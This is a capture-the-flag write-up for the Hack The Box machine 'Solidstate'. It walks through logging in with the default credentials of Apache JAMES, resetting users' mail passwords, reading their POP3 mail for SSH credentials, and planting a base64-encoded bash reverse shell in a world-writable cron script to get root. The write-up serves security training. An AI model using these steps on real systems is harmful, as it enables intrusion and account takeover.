# Solidstate
>Author : Xyan1d3
>Date : 2nd July 2021
>IP : 10.10.10.51
>OS : Linux
>Difficulty : Medium
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Fri Jul  2 13:11:44 2021 as: nmap -sC -sV -v -oN nmap/solidstate 10.10.10.51
Nmap scan report for solidstate.htb (10.10.10.51)
Host is up (0.067s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello solidstate.htb (10.10.14.9 [10.10.14.9]), 
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp open  pop3    JAMES pop3d 2.3.2
119/tcp open  nntp    JAMES nntpd (posting ok)
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Nmap all ports
```sql
# Nmap 7.91 scan initiated Fri Jul  2 16:54:14 2021 as: nmap -p- -v -oN nmap/solidstate-all-ports 10.10.10.51
Nmap scan report for solidstate.htb (10.10.10.51)
Host is up (0.066s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip
```

## Nmap scripts scan on all open ports
```sql
# Nmap 7.91 scan initiated Fri Jul  2 17:02:49 2021 as: nmap -p22,25,80,110,119,4555 -A -oN nmap/solidstate-scripts -v 10.10.10.51
Nmap scan report for solidstate.htb (10.10.10.51)
Host is up (0.067s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello solidstate.htb (10.10.14.9 [10.10.14.9]), 
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   67.59 ms 10.10.14.1
2   67.60 ms solidstate.htb (10.10.10.51)
```

## Apache JAMES Enumeration
Here, We have `Apache JAMES Server 2.3.2` running on the server and administration panel on port `4555/tcp`.

The default credentials of the `Apache JAMES Server` is `root` and `root`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.9]─[~/htb/solidstate]
└──╼ # nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

We have a `listusers` command which can be useful.
```python
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

We could now use another command called setpassword to set the password of all users from here.
```python
setpassword james PassW0rd
Password for james reset
setpassword thomas PassW0rd
Password for thomas reset
setpassword john PassW0rd
Password for john reset
setpassword mindy PassW0rd
Password for mindy reset
setpassword mailadmin PassW0rd
Password for mailadmin reset
```

We could now use `crackmapexec` to see if we are able to successfully change the passwords of the user and can SSH into the box with the new creds.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.9]─[~/htb/solidstate]
└──╼ # crackmapexec ssh 10.10.10.51 -u users -p PassW0rd
SSH         10.10.10.51     22     10.10.10.51      [*] SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u1
SSH         10.10.10.51     22     10.10.10.51      [-] james:PassW0rd Authentication failed.
SSH         10.10.10.51     22     10.10.10.51      [-] thomas:PassW0rd Authentication failed.
SSH         10.10.10.51     22     10.10.10.51      [-] john:PassW0rd Authentication failed.
SSH         10.10.10.51     22     10.10.10.51      [-] mindy:PassW0rd Authentication failed.
SSH         10.10.10.51     22     10.10.10.51      [-] mailadmin:PassW0rd Authentication failed.
```
And, Apparently not...

## POP3 Enumeration
We could now try to enumerate the POP3 Server on port `110/tcp`
```python
┌─[Magisk@Xyan1d3]─[10.10.14.9]─[~/htb/solidstate]
└──╼ # telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER john
+OK
PASS PassW0rd
+OK Welcome john
STAT
+OK 1 743
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
```
We see that the user `john` recieved a mail from `James` that to restrict `mindy`'s password and send her temporary creds. Now, We may login to the `mindy` account and check the email to see if she recieved any new creds.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.9]─[~/htb/solidstate]
└──╼ # telnet 10.10.10.51 110                                                     
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS PassW0rd
+OK Welcome mindy
STAT 
+OK 2 1945
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii 
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

We find out that she has recieved new creds.

|Username|Password|
|--|--|
|mindy|P@55W0rd1!2@|

# Initial FootHold as mindy
We use the credentials of `mindy` to SSH into the box.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.9]─[~/htb/solidstate]
└──╼ # ssh mindy@10.10.10.51
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jul  2 10:48:48 2021 from 10.10.14.9
mindy@solidstate:~$
```

We have `rbash` running on sshing into the box which we have to escape.
![[Pasted image 20210702202609.png]]

## Getting the user Flag
```python
mindy@solidstate:/$ cd /home/mindy/
mindy@solidstate:~$ ls -l
total 8
drwxr-x--- 2 mindy mindy 4096 Apr 26 12:37 bin
-rw------- 1 mindy mindy   33 Nov 18  2020 user.txt
mindy@solidstate:~$ cat user.txt 
0510e71c2e8c9cb333b36a38080d0dc2
```

# Root Escalation
We have a cron ruuning on the box which executes a python script named `/opt/tmp.py` every 1 minute. Which is readable and writable by our user.
We could inject a reverse shell inside the file and get a rev shell next time the cron executes.
```
mindy@solidstate:/opt$ ls -l
total 8
drwxr-xr-x 11 root root 4096 Apr 26 12:37 james-2.3.2
-rwxrwxrwx  1 root root  169 Jul  2 11:05 tmp.py
mindy@solidstate:/opt$ cat tmp.py 
#!/usr/bin/env python
import os
import sys
try:
     os.system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Lzg4ODggMD4mMQ== |base64 -d|bash')
except:
     sys.exit()
```

And We get a root shell back when the cron executes.
![[Pasted image 20210702203930.png]]
## Getting the root Flag
```python
root@solidstate:~# ls -l
total 4
-rw------- 1 root root 33 Nov 18  2020 root.txt
root@solidstate:~# cat root.txt 
4f4afb55463c3bc79ab1e906b074953d
```
